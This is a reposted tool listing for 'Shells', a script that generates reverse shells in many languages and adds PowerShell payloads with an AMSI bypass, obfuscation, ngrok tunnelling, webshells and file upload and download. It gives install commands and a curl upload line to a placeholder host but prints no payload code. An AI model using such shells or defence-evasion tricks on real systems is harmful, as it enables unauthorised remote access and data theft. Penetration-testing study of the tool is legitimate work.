---
title: Shells - Little Script For Generating Revshells
url: https://buaq.net/go-138402.html
source: unSafe.sh - 不安全
date: 2022-12-04
fetch_date: 2025-10-04T00:28:20.958128
---

# Shells - Little Script For Generating Revshells

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/968f8a328674f59a115a04193d1da2d2.jpg)

Shells - Little Script For Generating Revshells

A script for generating common revshells fast and easy. Especially nice when in need of Po
*2022-12-3 19:30:0
Author: [www.kitploit.com(查看原文)](/jump-138402.htm)
阅读量:35
收藏*

---

[![](https://blogger.googleusercontent.com/img/a/AVvXsEhmgcjxitEB-PgTFDU12v8BBVW45p1zFgF0WoQkE1qRAf3brw4cntmCnp4Waxc5PfFCThWy6gZugBP3GHP4hp57km0KxjF5ve4XNCZZaoDIZGGzb1VnAJySyd8ZAYjp0On5sJvt5FAlSjOwQH208ZRRAS7z3SL2XLadX604i5l8e4IoyOxQ_g1CdGsfdA=w640-h426)](https://blogger.googleusercontent.com/img/a/AVvXsEhmgcjxitEB-PgTFDU12v8BBVW45p1zFgF0WoQkE1qRAf3brw4cntmCnp4Waxc5PfFCThWy6gZugBP3GHP4hp57km0KxjF5ve4XNCZZaoDIZGGzb1VnAJySyd8ZAYjp0On5sJvt5FAlSjOwQH208ZRRAS7z3SL2XLadX604i5l8e4IoyOxQ_g1CdGsfdA)

A script for generating common revshells fast and easy.

## PowerShell revshells

* Shows [[email protected]](http://www.kitploit.com/cdn-cgi/l/email-protection), above the prompt and working-directory
* Has a partial AMSI-bypass, making some stuff a bit easier
* TCP and UDP
* Windows Powershell and Core Powershell
* Functions for uploading and downloading files. (Using [Updog](https://github.com/sc0tfree/updog "Updog") by sc0tfree)

## ngrok support

* ngrok can be started/stopped from inside the script
* payloads will be genereated with the ngrok addresses

## Updog support

* you can start/stop Updog from inside the script
* The PowerShell revshells have upload/download function embedded
* To upload from nix using curl: `curl -F path="absolute path for Updog-folder" -F file=filename http://UpdogIP/upload`

### To install Shells

```
git clone https://github.com/4ndr34z/shells
cd shells
./install.sh
```

### Screenshots

[![](https://blogger.googleusercontent.com/img/a/AVvXsEhmgcjxitEB-PgTFDU12v8BBVW45p1zFgF0WoQkE1qRAf3brw4cntmCnp4Waxc5PfFCThWy6gZugBP3GHP4hp57km0KxjF5ve4XNCZZaoDIZGGzb1VnAJySyd8ZAYjp0On5sJvt5FAlSjOwQH208ZRRAS7z3SL2XLadX604i5l8e4IoyOxQ_g1CdGsfdA=w640-h426)](https://blogger.googleusercontent.com/img/a/AVvXsEhmgcjxitEB-PgTFDU12v8BBVW45p1zFgF0WoQkE1qRAf3brw4cntmCnp4Waxc5PfFCThWy6gZugBP3GHP4hp57km0KxjF5ve4XNCZZaoDIZGGzb1VnAJySyd8ZAYjp0On5sJvt5FAlSjOwQH208ZRRAS7z3SL2XLadX604i5l8e4IoyOxQ_g1CdGsfdA) [![](https://blogger.googleusercontent.com/img/a/AVvXsEjuad7oSAu5Nqm85qU5h3A2zNz_RDYxaMSpVJKiweOm4UGB5wyD5cqe3iyXFcg4BxJvHpSMm4obstPvsp8RbI6b8eMigeOGGfBu5YnhgY2e_bMs2r5jJQ0gKIBQStsZVixd17m-Qbon_ScZjYUaM93nY6j2UNbrgu_JGupMkqGmImedmBQXPwvGNyLsSw=w640-h426)](https://blogger.googleusercontent.com/img/a/AVvXsEjuad7oSAu5Nqm85qU5h3A2zNz_RDYxaMSpVJKiweOm4UGB5wyD5cqe3iyXFcg4BxJvHpSMm4obstPvsp8RbI6b8eMigeOGGfBu5YnhgY2e_bMs2r5jJQ0gKIBQStsZVixd17m-Qbon_ScZjYUaM93nY6j2UNbrgu_JGupMkqGmImedmBQXPwvGNyLsSw) [![](https://blogger.googleusercontent.com/img/a/AVvXsEjmBL9w7erGW0KHP0M5TDDirDXrUDU62CFm7x7wD9cKx6HsobDe4M7XidhShDDDNsbgS-LN2c6FID96yiw7qj0g1_w79o6Jcr8lY9QKELJnfrT76g5TWiqyL_Kz0I5YJBHZQCdOHAeAPGXRV9ikAliQ4s7g5xo8LPJCOOEq_s26OImL6GmLU8pPZOJrJg=w640-h408)](https://blogger.googleusercontent.com/img/a/AVvXsEjmBL9w7erGW0KHP0M5TDDirDXrUDU62CFm7x7wD9cKx6HsobDe4M7XidhShDDDNsbgS-LN2c6FID96yiw7qj0g1_w79o6Jcr8lY9QKELJnfrT76g5TWiqyL_Kz0I5YJBHZQCdOHAeAPGXRV9ikAliQ4s7g5xo8LPJCOOEq_s26OImL6GmLU8pPZOJrJg) [![](https://blogger.googleusercontent.com/img/a/AVvXsEiYOdac1bf9VMj7l4HQHRItqnLGdoxvRKiN-J4riPJFYrnp5FOAkFcRcQuZIMX49HLzXAQtJpBb2bkasg_IGxjZ0rZ6gOk0-xrTN2-P-bZoQqwVT6avbIy3yV9ltLP9b7iy0ZNAe16onRtZhtXtYl08jsQEhVn_OxUsvMTwIeSPO-G9rW6W6eMVUtsdQA=w640-h262)](https://blogger.googleusercontent.com/img/a/AVvXsEiYOdac1bf9VMj7l4HQHRItqnLGdoxvRKiN-J4riPJFYrnp5FOAkFcRcQuZIMX49HLzXAQtJpBb2bkasg_IGxjZ0rZ6gOk0-xrTN2-P-bZoQqwVT6avbIy3yV9ltLP9b7iy0ZNAe16onRtZhtXtYl08jsQEhVn_OxUsvMTwIeSPO-G9rW6W6eMVUtsdQA) [![](https://blogger.googleusercontent.com/img/a/AVvXsEijA-WjY6r-KCf5Y5KO3szwB_AevaAeEFVly12hexq44Ubmu9inTB6KurDNkWaSttLEdBx3eIL--r7u6xFPQLbWDbTIeyvyCmToYxGK3V9pyd5XdqFNjzfXTA0KKQABSshbKRL1N2TDkMJiHiLoGjQWzLj9JS0bPMaDlIZ0Ykhb0VsJEcHpPbLtYesbSw=w640-h374)](https://blogger.googleusercontent.com/img/a/AVvXsEijA-WjY6r-KCf5Y5KO3szwB_AevaAeEFVly12hexq44Ubmu9inTB6KurDNkWaSttLEdBx3eIL--r7u6xFPQLbWDbTIeyvyCmToYxGK3V9pyd5XdqFNjzfXTA0KKQABSshbKRL1N2TDkMJiHiLoGjQWzLj9JS0bPMaDlIZ0Ykhb0VsJEcHpPbLtYesbSw) [![](https://blogger.googleusercontent.com/img/a/AVvXsEg4KffsdgrYyIiRvq6IU3U-3o_e-ZoRO9OE9kdrJCj-E48UvcoVMe4STcntMvixPELAb0iR5Fd4neZ1KpmfRTEmJ6k6P9tzVqsEBpo_didt4S9adW8XMXDmzlJzxuGi74qEksUVRapvRzMHq0CSIsCrSK6Dm7IWgqF0AmdrHdZ_k5nDP5JDDdNfvVZbBA=w640-h198)](https://blogger.googleusercontent.com/img/a/AVvXsEg4KffsdgrYyIiRvq6IU3U-3o_e-ZoRO9OE9kdrJCj-E48UvcoVMe4STcntMvixPELAb0iR5Fd4neZ1KpmfRTEmJ6k6P9tzVqsEBpo_didt4S9adW8XMXDmzlJzxuGi74qEksUVRapvRzMHq0CSIsCrSK6Dm7IWgqF0AmdrHdZ_k5nDP5JDDdNfvVZbBA) [![](https://blogger.googleusercontent.com/img/a/AVvXsEh6r5faj1PtA1SWaqYu1WR9jjmOvi9PgNL2MGjwpkrXIQC__KoriGmIZBz2cUMQ8UFVpqWyXvXOfpUQukocdSLPIuqa2Zk3MC7Rr5ALo5VTI0TF9KabjA_fpDCgSY3woJOQ53dWU9NneoWwz_0yAyMuq9vWXyW1Jm9tBaCgT58u-OKzANOIcWwSzM0XSA=w640-h252)](https://blogger.googleusercontent.com/img/a/AVvXsEh6r5faj1PtA1SWaqYu1WR9jjmOvi9PgNL2MGjwpkrXIQC__KoriGmIZBz2cUMQ8UFVpqWyXvXOfpUQukocdSLPIuqa2Zk3MC7Rr5ALo5VTI0TF9KabjA_fpDCgSY3woJOQ53dWU9NneoWwz_0yAyMuq9vWXyW1Jm9tBaCgT58u-OKzANOIcWwSzM0XSA)

### Youtube video

### Version 1.4.6

* Added webshells (ASPX, PHP, JSP)

### Version 1.4.5

* Added 2 c++ [revshell](https://www.kitploit.com/search/label/Revshell "revshell") binaries for Windows 32 and 64 bit.

### Version 1.4.4

* Fixed the handling of starting/stopping Updog

### Version 1.4.3

* Added Updog support
* Added Netcat binaries.
* Powershell: Created upload/download functionality (upload requires Updog for receiving files)
* Added more information about running ngrok and Updog.

### Version 1.4.2

* PowerShell: Added a new "mini AMSI-bypass". (It is a partial bypass) Based on Matt Graebers Reflection method
* PowerShell: Added a "upload" function in the Powershell reverseshell

### Version 1.4.1

* Removed AMSI. Not tested enough :-)

### Version 1.4

* Added AMSI-bypass for the powershell payloads

### Version 1.3.9

* Fixed bug when setting port
* Changed default port to 443
* PowerShell: obfuscated some more

### Version 1.3.8

* PowerShell: Minor changes to the UDP payload

### Version 1.3.7

* Using only native nc on macOS, because the one on homebrew doesn't work on incoming UDP
* PowerShell: Added UDP payloads

### Version 1.3.6

* PowerShell: Added more payloads

### Version 1.3.5

* PowerShell: Added some [randomization](https://www.kitploit.com/search/label/Randomization "randomization") and [obfuscation](https://www.kitploit.com/search/label/Obfuscation "obfuscation") for the payload

### Version 1.3.4

* PowerShell: Using UTF8 [encoding](https://www.kitploit.com/search/label/Encoding "encoding") in payload

### Version 1.3.3

* Added Golang

### Version 1.3.2

* Added OpenSSL

### Version 1.3.1

* Fixed bug in Python revshell
* Added awk
* Added Bash UDP

### Version 1.3

* Added Windows Python revshells

### Version 1.2.9

* Added a ngrok running-status

### Version 1.2.8

* Hiding ngrok choice if not installed

### Version 1.2.7

* Fixed the install options: not doing default option when pressing enter without making a choice

### Version 1.2.6

* Added support for ngrok.

### Version 1.2.4

* Added a install-script
* Added install options for checking and installing missing dependencies

### Version 1.2.3

* Added a couple of PHP shells

### Version 1.2.2

* Added shells for: Ruby, Perl, Telnet and zsh

### Version 1.2.1

* Added copy to clipboard using pbcopy on macOS
* Added info about listening netcat as the macOS versions doesn't display that

### Version 1.2

* ...